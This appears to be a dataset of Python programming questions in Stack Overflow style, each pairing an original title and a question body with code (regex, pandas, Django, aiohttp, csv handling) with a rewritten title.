Positive lookbehind vs match reset (\K) in Ruby regex," I just learned about the apparently undocumented \K behavior in Ruby regex (thanks to this answer by anubhava). This feature (possibly named Keep?) also exists in PHP, Perl, and Python regex flavors. It is described elsewhere as ""drops what was matched so far from the match to be returned."" Is this behavior identical to the positive lookbehind marker as used below? If not, what differences do the two exhibit? <code>  ""abc"".match(/ab\Kc/) # matches ""c"" ""abc"".match(/(?<=ab)c/) # matches ""c""",Positive lookbehind vs match reset (\K) regex feature
Creating a bar chart with Plotly and Django," I am trying to create a dashboard where I can analyse my model's data (Article) using the library plotly.The Plotly bar chart is not showing on my template, I am wondering if I am doing something wrong since there's no error with the code below :models.py dashboard.html Why is the bar chart not visible? Any suggestion ? <code>  from django.db import modelsfrom django.contrib.auth.models import Userimport plotly.plotly as pyimport plotly.graph_objs as goclass Article(models.Model): user = models.ForeignKey(User, default='1') titre = models.CharField(max_length=100, unique=True) slug = models.SlugField(max_length=40) likes = models.ManyToManyField(User, related_name=""likes"") def __str__(self): return self.titre @property def article_chart(self): data = [ go.Bar( x=[self.titre], #title of the article y=[self.likes.count()] #number of likes on an article ) ] plot_url = py.plot(data, filename='basic-bar') return plot_url <div>{{ article.article_chart }}</div>",How to create charts with Plotly on Django?
Splitting self-intersecting polygon only returned one polygon in shapely in Python," I am using Python 3.5 64 bit in Windows 7 64 bit, shapely version 1.5.13.I have the following code that returned me a self-intersecting polygon: This is correct. Then I tried to obtain the two individual polygons by using buffer(0): Unfortunately, it only returned of the the two polygons:Could anyone please help? Thanks! <code>  import numpy as npfrom shapely.geometry import Polygon, MultiPolygonimport matplotlib.pyplot as pltx = np.array([ 0.38517325, 0.40859912, 0.43296919, 0.4583215 , 0.4583215 , 0.43296919, 0.40859912, 0.38517325, 0.36265506, 0.34100929])y = np.array([ 62.5 , 56.17977528, 39.39698492, 0. , 0. , 17.34605377, 39.13341671, 60.4180932 , 76.02574417, 85.47008547])polygon = Polygon(np.c_[x, y])plt.plot(*polygon.exterior.xy) split_polygon = polygon.buffer(0)plt.plot(*polygon.exterior.xy)print(type(split_polygon))plt.fill(*split_polygon.exterior.xy)",Splitting self-intersecting polygon only returned one polygon in Shapely
"removing columns which has only ""nan"" values from a numpy matrix"," I have a NumPy matrix like the one below: I want to remove the columns which only involve nan values from the above matrix.How can I do this? Thanks. <code>  [[182 93 107 ..., nan nan -1] [182 93 107 ..., nan nan -1] [182 93 110 ..., nan nan -1] ..., [188 95 112 ..., nan nan -1] [188 97 115 ..., nan nan -1] [188 95 112 ..., nan nan -1]]","Removing columns which has only ""nan"" values from a NumPy array"
Pagination for list_route," How I can use pagination from list_route method?I have view: <code>  class view(mixins.CreateModelMixin, mixins.RetrieveModelMixin, viewsets.GenericViewSet):...@list_route(methods=['get'])def some_method(self, request, **kwargs): queryset = Model.objects.all() serializer = self.get_serializer(queryset, many=True) return Response(serializer.data)",How can I leverage builtin pagination for a list_route in the Django Rest Framework?
Python Iterating over two lists one after one," I have two lists list1 and list2 of numbers, and I want to iterate over them with the same instructions. Like this: But that feels redundant. I know I can write for item in list1 + list2:, but it has a price of running-time.Is there a way do that without loose time? <code>  for item in list1: print(item.amount) print(item.total_amount)for item in list2: print(item.amount) print(item.total_amount)",Iterating over two lists one after another
Iterating over two lists one after one," I have two lists list1 and list2 of numbers, and I want to iterate over them with the same instructions. Like this: But that feels redundant. I know I can write for item in list1 + list2:, but it has a price of running-time.Is there a way do that without loose time? <code>  for item in list1: print(item.amount) print(item.total_amount)for item in list2: print(item.amount) print(item.total_amount)",Iterating over two lists one after another
Casting Int to Float Slower Than Adding to Float in Python?," What is the reason that casting an integer to a float is slower than adding 0.0 to that int in Python? The output of which is:Add simple timing: 0.0001220703125Cast simple timing: 0.000469923019409Add total timing: 0.000164985656738Cast total timing: 0.00040078163147 <code>  import timeitdef add_simple(): for i in range(1000): a = 1 + 0.0def cast_simple(): for i in range(1000): a = float(1)def add_total(): total = 0 for i in range(1000): total += 1 + 0.0def cast_total(): total = 0 for i in range(1000): total += float(1)print ""Add simple timing: %s"" % timeit.timeit(add_simple, number=1)print ""Cast simple timing: %s"" % timeit.timeit(cast_simple, number=1)print ""Add total timing: %s"" % timeit.timeit(add_total, number=1)print ""Cast total timing: %s"" % timeit.timeit(cast_total, number=1)",Why is calling float() on a number slower than adding 0.0 in Python?
Passing argument to superclass constructor," I want to define C class object without rewriting all the P class constructor argument in C's constructor, but the above code doesn't seem to work. What is the right approach to do this?Clarification: The idea is to avoid putting parent class's constructor arguments in child class's constructor. It's just repeating too much. All my parent and child classes have many arguments to take in for constructors, so repeating them again and again is not very productive and difficult to maintain. I'm trying to see if I can only define what's unique for the child class in its constructor, but still initialize inherited attributes. <code>  class P(object): def __init__(self, a, b): self.a = a self.b = bclass C(P): def __init__(self, c): P.__init__() self.c = cobj = C(a, b, c) #want to instantiate a C with something like this",Passing arguments to superclass constructor without repeating them in childclass constructor
How to read the csv file properly if each row contains different number of fileds(number quite big)?," I have a text file from amazon, containing the following info: As you see, the data is separated by space and there are different number of columns in each row. However, so it is the text content. Here is the code I have tried: And such an error occurs: When I tried to read all the columns: And the error this time is: And given the review text is so long in many rows , the method of adding header names for each column in this question can not work. I wonder how to read the csv file if I want to keep the review text and skip them respectively. Thank you in advance! EDIT:The problem has been solved by Martin Evans perfectly. But now I am playing with another data set with similar but different format. Now the order of the data is converse: Do you have any idea to read it properly? It would be appreciated for any help! <code>  # user item time rating review text (the header is added by me for explanation, not in the text file disjiad123 TYh23hs9 13160032 5 I love this phone as it is easy to use hjf2329ccc TGjsk123 14423321 3 Suck restaurant pd.read_csv(filename, sep = "" "", header = None, names = [""user"",""item"",""time"",""rating"", ""review""], usecols = [""user"", ""item"", ""rating""])#I'd like to skip the text review part ValueError: Passed header names mismatches usecols pd.read_csv(filename, sep = "" "", header = None) Error tokenizing data. C error: Expected 229 fields in line 3, saw 320 # review text user item time rating (the header is added by me for explanation, not in the text file I love this phone as it is easy to used isjiad123 TYh23hs9 13160032 5 Suck restaurant hjf2329ccc TGjsk123 14423321 3 ",How to read the csv file properly if each row contains different number of fields (number quite big)?
equivalent of source() of R in python," Like we have source() function to execute a R program in another R program in R studio, how do I execute a python program in another python program? <code> ",Equivalent of source() of R in Python
SciPy interp2D for pairs of co-ordinates," I'm using scipy.interpolate.interp2d to create an interpolation function for a surface. I then have two arrays of real data that I want to calculate interpolated points for. If I pass the two arrays to the interp2d function I get an array of all the points, not just the pairs of points.My solution to this is to zip the two arrays into a list of coordinate pairs and pass this to the interpolation function in a loop: My question is, is there a better (more elegant, Pythonic?) way of achieving the same result? <code>  f_interp = interpolate.interp2d(X_table, Y_table,Z_table, kind='cubic')co_ords = zip(X,Y)out = []for i in range(len(co_ords)): X = co_ords[i][0] Y = co_ords[i][1] value = f_interp(X,Y) out.append(float(value))",SciPy interp2D for pairs of coordinates
Python3 - TypeError: module.__init__() takes at most 2 arguments (3 given)," Please don't mark as duplicate, other similar questions did not solve my issue.This is my setup Main.py: ListitAction.py: ViewAction.py Running: The only error message I receive is: Even if I try for the python3 console, I received the same error message: I am new to Python, but not new to programming. I'm assuming that my error messages have to do with the import statements, but based on the message I can't really figure out what it means. <code>  /main.py/actions/ListitAction.py/actions/ViewAction.py from actions import ListitAction, ViewAction class ListitAction(object): def __init__(self): #some init behavior def build_uri(): return ""test.uri"" from actions import ListitActionclass ViewAction(ListitAction): def __init__(self, view_id): ListitAction.__init__(self) self.view_id = view_id def build_uri(): return ""test"" $ python3 main.py Traceback (most recent call last): File ""/home/jlevac/workspace/project/listit.py"", line 11, in <module> from actions import ListitAction, ViewAction, CommentsAction File ""/home/jlevac/workspace/project/actions/ViewAction.py"", line 3, in <module> class ViewAction(ListitAction):TypeError: module.__init__() takes at most 2 arguments (3 given) $python3from actions import ViewAction",importing module causes TypeError: module.__init__() takes at most 2 arguments (3 given)
How can I get a list of characters from a python string where emojis are treated as single characters?," I am working in Python 2 and I have a string containing emojis as well as other unicode characters. I need to convert it to a list where each entry in the list is a single character/emoji. The desired output is: The actual output is: How can I achieve the desired output? <code>  x = u'xyz'char_list = [c for c in x] ['', '', 'x', 'y', 'z', '', ''] [u'\ud83d', u'\ude18', u'\ud83d', u'\ude18', u'x', u'y', u'z', u'\ud83d', u'\ude0a', u'\ud83d', u'\ude0a']",Correctly extract Emojis from a Unicode string
How to get the number of all the keys in a dictionary of dictionaries in Python," I have a dictionary of dictionaries in Python 2.7.I need to quickly count the number of all keys, including the keys within each of the dictionaries.So in this example I would need the number of all keys to be 6: I know I can iterate through each key with for loops, but I am looking for a quicker way to do this, since I will have thousands/millions of keys and doing this is just ineffective: <code>  dict_test = {'key2': {'key_in3': 'value', 'key_in4': 'value'}, 'key1': {'key_in2': 'value', 'key_in1': 'value'}} count_the_keys = 0for key in dict_test.keys(): for key_inner in dict_test[key].keys(): count_the_keys += 1# something like this would be more effective# of course .keys().keys() doesn't workprint len(dict_test.keys()) * len(dict_test.keys().keys())",Get the number of all keys in a dictionary of dictionaries in Python
Python set intersection is faster then Rust HashSet intersection," Here is my Python code: Here is my Rust code: I believe these are roughly equivalent. I get the following performance results: and Building with cargo and --release give the same result.I realize that Python's set is implemented in C, and so is expected to be fast, but I did not expect it to be faster than Rust. Wouldn't it have to do extra type checking that Rust would not?Perhaps I'm missing something in the way I compile my Rust program, are there any other optimizations flags that I should be using?Another possibility is that the code is not really equivalent, and Rust is doing unnecessary extra work, am I missing anything?Python version: Rust version I am using Ubuntu 14.04 and my system architecture is x86_64. <code>  len_sums = 0for i in xrange(100000): set_1 = set(xrange(1000)) set_2 = set(xrange(500, 1500)) intersection_len = len(set_1.intersection(set_2)) len_sums += intersection_lenprint len_sums use std::collections::HashSet;fn main() { let mut len_sums = 0; for _ in 0..100000 { let set_1: HashSet<i32> = (0..1000).collect(); let set_2: HashSet<i32> = (500..1500).collect(); let intersection_len = set_1.intersection(&set_2).count(); len_sums += intersection_len; } println!(""{}"", len_sums);} time python set_performance.py50000000real 0m11.757suser 0m11.736ssys 0m0.012s rustc set_performance.rs -O time ./set_performance 50000000real 0m17.580suser 0m17.533ssys 0m0.032s In [3]: import sysIn [4]: sys.versionOut[4]: '2.7.6 (default, Jun 22 2015, 17:58:13) \n[GCC 4.8.2]' $ rustc --versionrustc 1.5.0 (3d7cd77e4 2015-12-04)",Why is Python set intersection faster than Rust HashSet intersection?
How to get the optimal variables in Pulp," I am using Pulp with Python to solve an optimization problem. I am using Now, I would like to access the optimization variables. How to do this?In the documentation of Pulp, I found something like use_vars[i].varValue but I should loop to get the whole vector. Can I get it directly like in the objective value? Anyone familiar with Pulp?  <code>  import pulp# codepulp.prob.objective.value()",How to get the optimal optimization variables in Pulp with Python?
How to find all divs who's class starts with a string in BeautifulSoup?," In BeautifulSoup, if I want to find all div's where whose class is span3, I'd just do: However, in my case, I want to find all div's whose class starts with span3, therefore, BeautifulSoup should find: And so on...How do I achieve what I want? I am familiar with regular expressions; however I do not know how to implement them to beautiful soup nor did I find any help by going through BeautifulSoup's documentation. <code>  result = soup.findAll(""div"",{""class"":""span3""}) <div id=""span3 span49""><div id=""span3 span39"">",How to find all divs whose class starts with a string in BeautifulSoup?
Is relying on __del__() for cleanup in python unreliable?," I was reading about different ways to clean up objects in Python, and I have stumbled upon these questions (1, 2) which basically say that cleaning up using __del__() is unreliable and the following code should be avoid: The problem is, I'm using exactly this code, and I can't reproduce any of the issues cited in the questions above. As far as my knowledge goes, I can't go for the alternative with with statement, since I provide a Python module for a closed-source software (testIDEA, anyone?) This software will create instances of particular classes and dispose of them, these instances have to be ready to provide services in between. The only alternative to __del__() that I see is to manually call open() and close() as needed, which I assume will be quite bug-prone.I understand that when I'll close the interpreter, there's no guarantee that my objects will be destroyed correctly (and it doesn't bother me much, heck, even Python authors decided it was OK). Apart from that, am I playing with fire by using __del__() for cleanup? <code>  def __init__(self): rc.open()def __del__(self): rc.close()",Is relying on __del__() for cleanup in Python unreliable?
Pandas split column of lists into multiple columns," I have a Pandas DataFrame with one column: How can split this column of lists into two columns?Desired result: <code>  df = pd.DataFrame({""teams"": [[""SF"", ""NYG""] for _ in range(7)]}) teams0 [SF, NYG]1 [SF, NYG]2 [SF, NYG]3 [SF, NYG]4 [SF, NYG]5 [SF, NYG]6 [SF, NYG] team1 team20 SF NYG1 SF NYG2 SF NYG3 SF NYG4 SF NYG5 SF NYG6 SF NYG",Split a Pandas column of lists into multiple columns
Find split point for list such that sum of values is as close as possible to equal," This is not the standard partitioning problem, as I need to maintain the order of elements in the list.So for example if I have a list and I want two chunks, then the split should give for a sum of 17 on each side. For three chunks the result would be for sums of 12, 12, and 10.Edit for additional explanationI currently divide the sum with the number of chunks and use that as a target, then iterate till I get close to that target. The problem is that certain data sets can mess the algorithm up, for example trying to divide the following into 3:- Sum is 300, target is 100. The first chunk would sum to 95, second would be sum to 90, third would sum to 110, and 5 would be 'leftover'. Appending it where it's supposed to be would give 95, 90, 115, where a more 'reasonable' solution would be 110, 100, 90.end editBackground:I have a list containing text (song lyrics) of varying heights, and I want to divide the text into an arbitrary number of columns. Currently I calculate a target height based on the total height of all lines, but obviously this is a consistent underestimate, which in some cases results in a suboptimal solution (the last column is significantly taller). <code>  [1, 6, 2, 3, 4, 1, 7, 6, 4] [[1, 6, 2, 3, 4, 1], [7, 6, 4]] [[1, 6, 2, 3], [4, 1, 7], [6, 4]] [95, 15, 75, 25, 85, 5]",Split a list of numbers into n chunks such that the chunks have (close to) equal sums and keep the original order
Python increment values recursevly in one-line loop," I try to process such data: So that it produces a list with values updated to be a running sum. Now I do it with a multiline loop: How to make the loop one-liner, so that I got: <code>  some_data = [ {'value': 2, 'date':'2016-02-06'}, {'value': 1, 'date':'2016-02-07'}, {'value': 5, 'date':'2016-02-08'}, {'value': 3, 'date':'2016-02-09'}, {'value': 1, 'date':'2016-02-10'}, ] def values_incremented(some_data): temp_sum = 0 result = [] for element in some_data: temp_sum += element['value'] result.append({'value': temp_sum, 'date': element['date']}) return result return [{'value': somehow_incremented, 'date': element['date']} for element in some_data]",Python compute running sum of values in one-line
Kivy Pyinstaller compile to exe," I am trying to compile a Kivy application to a windows exe, but I keep receiving an attribute error:AttributeError: 'str' object has no attribute 'items'I have compiled other applications, and followed the instructions line for line per the kivy page (completing the demo), but when I try to do the same to my application I receive the above error. I'm not sure where to go I've been trying for several hours now and I can't seem to make any headway. Any help would be greatly appreciated. Edit:Below is the tail of the stack trace, the whole thing is long and so I pasted in what I think may be relevant, but frankly I'm a bit out of my depth here :) My Spec: EDIT:Apparently it has nothing to do with Kivy as I have rewritten the front end to use TKinter and i'm still having the issue. <code>  6363 WARNING: stderr: File ""c:\python27\lib\site-packages\PyInstaller\depend\analysis.py"", line 198, in _safe_import_module hook_module.pre_safe_import_module(hook_api)6375 WARNING: stderr: hook_module.pre_safe_import_module(hook_api) File ""c:\python27\lib\site-packages\PyInstaller\hooks\pre_safe_import_module\hook-six.moves.py"", line 55, in pre_safe_import_module6378 WARNING: stderr: File ""c:\python27\lib\site-packages\PyInstaller\hooks\pre_safe_import_module\hook-six.moves.py"", line 55, in pre_safe_import_module for real_module_name, six_module_name in real_to_six_module_name.items():6388 WARNING: stderr: for real_module_name, six_module_name in real_to_six_module_name.items(): AttributeError: 'str' object has no attribute 'items'6396 WARNING: stderr: AttributeError: 'str' object has no attribute 'items' # -*- mode: python -*-from kivy.deps import sdl2, glewblock_cipher = Nonea = Analysis(['face.py'], pathex=['c:\\Users\\Home\\PycharmProjects\\MSICheck\\Images'], binaries=None, datas=None, hiddenimports=['sqlite3','kivy.app','six','packaging','packaging.version','packaging.specifiers'], hookspath=[], runtime_hooks=[], excludes=[], win_no_prefer_redirects=False, win_private_assemblies=False, cipher=block_cipher)pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)exe = EXE(pyz, a.scripts, exclude_binaries=True, name='face', debug=True, strip=False, upx=True, console=True )coll = COLLECT(exe,Tree('c:\\Users\\Home\\PycharmProjects\\MSICheck\\Images\\'), a.binaries, a.zipfiles, a.datas, *[Tree(p) for p in (sdl2.dep_bins + glew.dep_bins)], strip=False, upx=True, name='face')",Pyinstaller compile to exe
Removing punctuation except intra-word dashes Python," There already is an approaching answer in R gsub(""[^[:alnum:]['-]"", "" "", my_string), but it does not work in Python: gives 'compactified on a calab yau threefold @ ,.'So not only does it remove the intra-word dash, it also removes the last letter of the word preceding the dash. And it does not remove punctuationExpected result (string without any punctuation but intra-word dash): 'compactified on a calabi-yau threefold' <code>  my_string = 'compactified on a calabi-yau threefold @ ,.'re.sub(""[^[:alnum:]['-]"", "" "", my_string)",Replacing punctuation except intra-word dashes with a space
"Python: variable with ""any"" value"," Say I have list of tuples: Is there a way in Python to write something like where * means ""I dont care about this value""? So we are checking if there is a tuple with 1 at the first position and with whatever value on the second one.As far as I know there are special mechanisms in other languages, but I just dont know the name of this particular problem. So is there similar behavior in Python?P.S.: I know that I can use list comprehensions here. I am just interested in this particular mechanism. <code>  list = [(1,5), (1,7), (2,3)] if (1, *) in list: do things",Find tuple structure containing an unknown value inside a list
Getting csv.Sniffer working with quoted values," I'm trying to use python's CSV sniffer tool as suggested in many StackOverflow answers to guess if a given CSV file is delimited by ; or ,.It's working fine with basic files, but when a value contains a delimiter, it is surrounded by double quotes (as the standard goes), and the sniffer throws _csv.Error: Could not determine delimiter.Has anyone experienced that before?Here is a minimal failing CSV file: And the proof of concept: I have total control over the generation of input CSV file; but sometimes it is modified by a third party using MS Office and the delimiter is replaced by semicolumns, so I have to use this guessing approach.I know I could stop using commas in the input file, but I would like to know if I'm doing something wrong first. <code>  column1,column20,""a, b"" Python 3.5.1 (default, Dec 7 2015, 12:58:09) [GCC 5.2.0] on linuxType ""help"", ""copyright"", ""credits"" or ""license"" for more information.>>> import csv>>> f = open(""example.csv"", ""r"")>>> f.seek(0);0>>> csv.Sniffer().sniff(f.read(), delimiters=';,')Traceback (most recent call last): File ""<stdin>"", line 1, in <module> File ""/usr/lib/python3.5/csv.py"", line 186, in sniff raise Error(""Could not determine delimiter"")_csv.Error: Could not determine delimiter",Getting csv.Sniffer to work with quoted values
how does python variable inheritance work," I'm trying something very basic with Python inheritance: but I keep gettingChild1 instance has no attribute 'text'how are variables passed to children? <code>  class Parent: def __init__(self): self.text = 'parent' def getText(self): print self.textclass Child1(Parent): def __init__(self): self.x = 'x'class Child2(Parent): def __init__(self): self.x = 'x'if __name__ == ""__main__"": parent = Parent() child1 = Child1() child2 = Child2() parent.getText() child1.getText() child2.getText()",How does python variable inheritance work?
Pandas concat with Series generates empty data frame," Can someone explain what is wrong with this pandas concat code, and why data frame remains empty ?I am using anaconda distibution, and as far as I remember it was working before. <code> ",concat a DataFrame with a Series in Pandas
Cleanest way to obtain the numeric prefix of a string," What is the cleanest way to obtain the numeric prefix of a string in Python? By ""clean"" I mean simple, short, readable. I couldn't care less about performance, and I suppose that it is hardly measurable in Python anyway.For example:Given the string '123abc456def', what is the cleanest way to obtain the string '123'?The code below obtains '123456': So I am basically looking for some way to replace the if with a while. <code>  input = '123abc456def'output = ''.join(c for c in input if c in '0123456789')",Cleanest way to obtain the numeric digits from a string
Django 1.9a1 __init__.py is visible even though it should be deleted (Windows)," I'm having a strange behaviour here: I just upgraded to Django 1.9.4 from Django 1.9a1 using pip. The installation went fine and Django was running smoothly, but during start up, it still showed the version number ""1.9a1"". Just to make sure I uninstalled Django again using pip and confirmed that my django folders are no longer existing in C:\Program Files (x86)\Python 3.5\lib\site-packages (neither the ""django"" nor the ""Django-1.9.4"" folder).After starting the server again, I was surprised to read the error message I expected the error to be something like ""package django not found"" or similar. Since eclipse provides the file name as link, I clicked on it an eclipse opened a file with content I double-checked that this file is not available via command line and via windows explorer.Where is this file located and how can I get rid of it? Or is it generated automatically (and if yes, how can I correct this mechanism)Or am I missing something completely obvious?Additional info:I re-installed Django 1.9.4 and init.py file located at C:\Program Files (x86)\Python 3.5\lib\site-packages\django__init__.py shows the correct version info. But still, if I run a Django project, the version info given is 1.9a1 .Even when I open a cmd prompt and enter the answer is 1.9a1Update 2016-03-13 17:57:I uninstalled again and used the explicit ==1.9.4 suggested by alecxe. This solved part of the problem:Now, if I open the command line, gives me the correct answer (1.9.4). But in Eclipse/PyDev, my project is no longer starting. The first error message is: Of course, the admin module is existing on the file system.Just to check, I started a new project in the console using and the new project is sucessfully created. When I use PyDev inside Eclipse to start a new project (using ""new""/""PyDev Django Project""), the process fails! The project directory as well as manage.py are created, but the project directory is empty (no init.py, settings.py, urls.py, wsgi.py).It seems like Eclipse/PyDev is not using the correct django installation, even though all file names given are the correct one. Is there maybe any caching involved? And yes, I re-started Eclipse after re-installation.Additional Info 2016-03-14 17:44:I just re-started my computer and surprisingly, my eclips was now able to run my project again - the error described above disappearde, BUT the django version number displayed is 1.9a1 again! Now I fired up the command prompt and python -c ""import django; print(django.get_version())"" gave me 1.9a1 again, too! What I did next was to start the command prompt again as administrator and - tataa - I got a 1.9.4.So the problem seems to be related to admin privileges which might be due to installing python in C:\Program Files (x86)\Python 3.5. I used the console window with admin rights for all pip installs / uninstalls described above. Is there some windows mechanism which could explain this behaviour?Solution 2016-03-14 18:17:I now searched my whole C: drive for folders containing ""django"", and I found one in C:\Users\[my_username]\AppData\Local\VirtualStore\Program Files (x86)\Python 3.5\Lib\site-packages\djangoand - surprise surprise - it contained the init.py file with the wrong version number. So it seems like I installed the 1.9a1 without admin privileges and eclipse always used this version since it is started without admin privileges, too. After some research about Windows VirtualStore I decided to manually delete the whole C:\Users\[my_username]\AppData\Local\VirtualStore\Program Files (x86)\Python 3.5 folder.Immediately after, my cmd-window showed me version 1.9.4, independent of admin- or non-admin-mode. And - most important - when I ran my django project in eclipse, it showed the correct version number, too. Just to be sure, I created a new django project using the PyDev wizard, and all project files were created correctly. So in summary, the problem was due to a previous install of django without admin rights, followed by a django installation with admin rights. The responsible mechanism was the Windows VirtualStore, not Eclipse or PyDev. I will leave the whole description of my Odyssee as is, maybe it helps someone to find the topic. I will give a short summary answer below.  <code>  from django.core.management import execute_from_command_lineFile ""C:\Program Files (x86)\Python 3.5\lib\site-packages\django\__init__.py"", line 1, in <module>from django.utils.version import get_versionImportError: No module named 'django.utils' from django.utils.version import get_versionVERSION = (1, 9, 0, 'alpha', 1)__version__ = get_version(VERSION)[...] python -c ""import django; print(django.get_version())"" python -c ""import django; print(django.get_version())"" Unhandled exception in thread started by <function check_errors.<locals>.wrapper at 0x03F72108>Traceback (most recent call last): File ""C:\Program Files (x86)\Python 3.5\lib\site-packages\django\apps\config.py"", line 118, in create cls = getattr(mod, cls_name)AttributeError: module 'django.contrib' has no attribute 'admin' django-admin startproject mysite",Django 1.9a1 __init__.py is visible in eclipse/PyDev even though it should be deleted (Windows)
Fetching multiple urls with aiohttp: handling errors," In earlier question, one of authors of aiohttp kindly suggested way to fetch multiple urls with aiohttp using the new async with syntax from Python 3.5: However when one of the session.get(url) requests breaks (as above because of http://SDFKHSKHGKLHSKLJHGSDFKSJH.com) the error is not handled and the whole thing breaks.I looked for ways to insert tests about the result of session.get(url), for instance looking for places for a try ... except ..., or for a if response.status != 200: but I am just not understanding how to work with async with, await and the various objects.Since async with is still very new there are not many examples. It would be very helpful to many people if an asyncio wizard could show how to do this. After all one of the first things most people will want to test with asyncio is getting multiple resources concurrently.GoalThe goal is that we can inspect the_results and quickly see either: this url failed (and why: status code, maybe exception name), orthis url worked, and here is a useful response object <code>  import aiohttpimport asyncioasync def fetch(session, url): with aiohttp.Timeout(10): async with session.get(url) as response: return await response.text()async def fetch_all(session, urls, loop): results = await asyncio.wait([loop.create_task(fetch(session, url)) for url in urls]) return resultsif __name__ == '__main__': loop = asyncio.get_event_loop() # breaks because of the first url urls = ['http://SDFKHSKHGKLHSKLJHGSDFKSJH.com', 'http://google.com', 'http://twitter.com'] with aiohttp.ClientSession(loop=loop) as session: the_results = loop.run_until_complete( fetch_all(session, urls, loop)) # do something with the the_results",asyncio web scraping 101: fetching multiple urls with aiohttp
PyQt 5: combobox click event," I have been trying to get a QComboBox in PyQt5 to become populated from a database table. The problem is trying to find a method that recognizes a click event on it.In my GUI, my combo-box is initially empty, but upon clicking on it I wish for the click event to activate my method for communicating to the database and populating the drop-down list. It seems so far that there is no built-in event handler for a click-event for the combo-box. I am hoping that I am wrong on this. I hope someone will be able to tell me that there is a way to do this.The best article I could find on my use-case here is from this link referring to PyQt4 QComboBox:dropdown event/callback in combo-box in pyqt4I also found another link that contains a nice image of a QComboBox.The first element seems to be a label followed by a list:Catch mouse button pressed signal from QComboBox popup menu <code> ",QComboBox click event
Supporting multiple Python module versions," I looked around but cannot find a clear answer to my question.I have a very legitimate need for supporting N-versions of the same Python module.If they are stored in the same same package/directory, they would have to be uniquely named, like in the following example: And each would, in turn, store its version number via the ""version"" attribute.The consuming program then imports the correct version that it needs(e.g.: import my_module_1.1).Is this the optimal (and most pythonic) way to accomplish this multi-module version need?Thank you! <code>  .../some/package/my_module_1.0.py .../some/package/my_module_1.1.py .../some/package/my_module_2.0.py -- etc. --",Supporting multiple Python module versions (with the same version of Python)
How to get python libraries in pyspark?," I want to use matplotlib.bblpath or shapely.geometry libraries in pyspark.When I try to import any of them I get the below error: I know the module isn't present, but how can these packages be brought to my pyspark libraries? <code>  >>> from shapely.geometry import polygonTraceback (most recent call last): File ""<stdin>"", line 1, in <module>ImportError: No module named shapely.geometry",How do I get Python libraries in pyspark?
How to make inline plots in Pycharm larger?," I have made my plots inline on my Ipython Notebook with ""%matplotlib inline.""Now, the plot appears. However, it is very small. Is there a way to make it appear larger using either notebook settings or plot settings? <code> ",How to make inline plots in Jupyter Notebook larger?
How to efficiently draw exactly n points on screen?," This sounds like an easy question, but I find it surprisingly tricky to get right with good performance.The first algorithm I've come up with is to draw points randomly, check from a set if it's already been drawn, and draw it otherwise. This works fine if we are drawing few points but slows down catastrophically as we approach filling the screen.The best I came up with is to construct the list of pixels, shuffle it and pick the first n (I used python's random.sample for that). It works better, but is still a bit slow because the whole list of pixels needs to be constructed in memory, which is horribly overkill when drawing 5 points. Here's my python code: Any suggestions for a better algorithm?Edit: Just found out this problem is called ""reservoir sampling"". Wikipedia has a number of good algorithms: https://en.wikipedia.org/wiki/Reservoir_sampling <code>  #!/usr/bin/env python"""""" drawn n random points on the screen """"""import pygamefrom pygame.locals import *import sysimport randomfrom itertools import productn = int(sys.argv[1])s = pygame.display.set_mode()sx, sy = s.get_size()points = random.sample(list(product(range(sx), range(sy))), n)for p in points: s.fill((255, 255, 255), pygame.Rect(*p, 1, 1))pygame.display.flip()while True: for event in pygame.event.get(): if event.type == QUIT or event.type == KEYDOWN: sys.exit()",How to efficiently draw exactly N points on screen?
splitting one csv into five files in python," I have a csv file of about 5000 rows in python i want to split it into five files.I wrote a code for it but it is not working The above code creates many fileswith empty content.How to split one files into five csv files? <code>  import codecsimport csvNO_OF_LINES_PER_FILE = 1000def again(count_file_header,count): f3 = open('write_'+count_file_header+'.csv', 'at') with open('import_1458922827.csv', 'rb') as csvfile: candidate_info_reader = csv.reader(csvfile, delimiter=',', quoting=csv.QUOTE_ALL) co = 0 for row in candidate_info_reader: co = co + 1 count = count + 1 if count <= count: pass elif count >= NO_OF_LINES_PER_FILE: count_file_header = count + NO_OF_LINES_PER_FILE again(count_file_header,count) else: writer = csv.writer(f3,delimiter = ',', lineterminator='\n',quoting=csv.QUOTE_ALL) writer.writerow(row)def read_write(): f3 = open('write_'+NO_OF_LINES_PER_FILE+'.csv', 'at') with open('import_1458922827.csv', 'rb') as csvfile: candidate_info_reader = csv.reader(csvfile, delimiter=',', quoting=csv.QUOTE_ALL) count = 0 for row in candidate_info_reader: count = count + 1 if count >= NO_OF_LINES_PER_FILE: count_file_header = count + NO_OF_LINES_PER_FILE again(count_file_header,count) else: writer = csv.writer(f3,delimiter = ',', lineterminator='\n',quoting=csv.QUOTE_ALL) writer.writerow(row)read_write()",Splitting one csv into multiple files
splitting one csv into multiple files in python," I have a csv file of about 5000 rows in python i want to split it into five files.I wrote a code for it but it is not working The above code creates many fileswith empty content.How to split one files into five csv files? <code>  import codecsimport csvNO_OF_LINES_PER_FILE = 1000def again(count_file_header,count): f3 = open('write_'+count_file_header+'.csv', 'at') with open('import_1458922827.csv', 'rb') as csvfile: candidate_info_reader = csv.reader(csvfile, delimiter=',', quoting=csv.QUOTE_ALL) co = 0 for row in candidate_info_reader: co = co + 1 count = count + 1 if count <= count: pass elif count >= NO_OF_LINES_PER_FILE: count_file_header = count + NO_OF_LINES_PER_FILE again(count_file_header,count) else: writer = csv.writer(f3,delimiter = ',', lineterminator='\n',quoting=csv.QUOTE_ALL) writer.writerow(row)def read_write(): f3 = open('write_'+NO_OF_LINES_PER_FILE+'.csv', 'at') with open('import_1458922827.csv', 'rb') as csvfile: candidate_info_reader = csv.reader(csvfile, delimiter=',', quoting=csv.QUOTE_ALL) count = 0 for row in candidate_info_reader: count = count + 1 if count >= NO_OF_LINES_PER_FILE: count_file_header = count + NO_OF_LINES_PER_FILE again(count_file_header,count) else: writer = csv.writer(f3,delimiter = ',', lineterminator='\n',quoting=csv.QUOTE_ALL) writer.writerow(row)read_write()",Splitting one csv into multiple files
